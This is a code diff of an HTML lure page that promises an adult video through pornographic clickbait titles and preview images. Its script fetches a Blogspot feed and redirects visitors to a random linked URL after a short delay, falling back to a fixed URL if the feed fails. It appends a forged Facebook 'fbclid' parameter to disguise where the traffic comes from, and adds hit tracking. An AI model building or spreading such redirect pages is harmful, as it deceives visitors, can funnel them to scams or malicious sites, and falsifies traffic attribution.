@@ -4,70 +4,76 @@
 <meta charset="UTF-8">
 <meta name="robots" content="noindex, nofollow">
 <title>[Enkai987’s 100,000 Thank You Offer EP.5] Thailand’s No.1 P0RN star Fuji, a hot and...</title>
-<meta property="og:title" content="P0RN_55188_New_48-FullHD.mp4">
+<meta property="og:title" content="[Enkai987’s 100,000 Thank You Offer EP.5] Thailand’s No.1 P0RN star Fuji, a hot and...">
 <meta property="og:image" itemprop="image" content="https://i.ibb.co.com/XxGt9WvF/1731182410743.jpg">
+<meta property="og:image" content="https://i.ibb.co.com/XxGt9WvF/1731182410743.jpg" />
+<meta property="og:image:width" content="1200" />
+<meta property="og:image:height" content="630" />
+<meta property="og:image:alt" content="[Enkai987’s 100,000 Thank You Offer EP.5] Thailand’s No.1 P0RN star Fuji, a hot and..." />
 <link rel="shortcut icon" href="https://iili.io/fInUDHQ.md.png" type="image/png">
+
 <script>
     const fallbackURL = "https://media-next.eu.org/yt/";
+    const delayMs = 3000; // <--- delay 3 detik sebelum redirect
 
     function generateFbclid() {
-      // fbclid biasanya string acak panjang
       return "fbclid=" + Math.random().toString(36).substring(2) + Date.now();
     }
 
     function addFbclid(url) {
-      // Jika URL punya query
-      if (url.includes("?")) {
-        return url + "&" + generateFbclid();
-      }
-      // Jika belum punya query
-      return url + "?" + generateFbclid();
+      return url.includes("?")
+        ? url + "&" + generateFbclid()
+        : url + "?" + generateFbclid();
+    }
+
+    function redirectWithDelay(url) {
+      setTimeout(() => {
+        window.location.href = url;
+      }, delayMs);
     }
 
     function redirectDariFeed(data) {
       const entries = data.feed.entry;
       if (!entries || entries.length === 0) {
-        window.location.href = addFbclid(fallbackURL);
+        redirectWithDelay(addFbclid(fallbackURL));
         return;
       }
 
       const urls = entries.map(entry => {
-        const links = entry.link;
-        for (let i = 0; i < links.length; i++) {
-          if (links[i].rel === "alternate") {
-            return links[i].href;
-          }
-        }
+        const link = entry.link.find(l => l.rel === "alternate");
+        return link ? link.href : null;
       }).filter(Boolean);
 
       if (urls.length === 0) {
-        window.location.href = addFbclid(fallbackURL);
+        redirectWithDelay(addFbclid(fallbackURL));
         return;
       }
 
       // Redirect acak
       const randomIndex = Math.floor(Math.random() * urls.length);
       const finalURL = addFbclid(urls[randomIndex]);
-      window.location.href = finalURL;
+      redirectWithDelay(finalURL);
     }
 
-    // Jika gagal load JSONP, redirect fallback
+    // Jika gagal load JSON feed dalam 5 detik → fallback
     setTimeout(() => {
       try {
         if (typeof redirectDariFeed !== "function") {
-          window.location.href = addFbclid(fallbackURL);
+          redirectWithDelay(addFbclid(fallbackURL));
         }
       } catch {
-        window.location.href = addFbclid(fallbackURL);
+        redirectWithDelay(addFbclid(fallbackURL));
       }
     }, 5000);
-  </script>
+</script>
 
-  <script src="https://copetksnu.blogspot.com/feeds/posts/default?alt=json-in-script&callback=redirectDariFeed&max-results=100"></script>
+<script src="https://copetksnu.blogspot.com/feeds/posts/default?alt=json-in-script&callback=redirectDariFeed&max-results=100"></script>
 </head>
+
 <body>
-<!-- Histats.com  START  (aync)-->
-<script type="text/javascript">var _Hasync= _Hasync|| [];
+<!-- Histats -->
+<script type="text/javascript">
+var _Hasync= _Hasync|| [];
 _Hasync.push(['Histats.start', '1,4828760,4,0,0,0,00010000']);
 _Hasync.push(['Histats.fasi', '1']);
 _Hasync.push(['Histats.track_hits', '']);
@@ -75,9 +81,9 @@ _Hasync.push(['Histats.track_hits', '']);
 var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
 hs.src = ('//s10.histats.com/js15_as.js');
 (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
-})();</script>
-<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4828760&101" alt="" border="0"></a></noscript>
-<!-- Histats.com  END  -->
+})();
+</script>
+<noscript><a href="/" target="_blank"><img src="//sstatic1.histats.com/0.gif?4828760&101" alt="" border="0"></a></noscript>
 
 </body>
 </html>
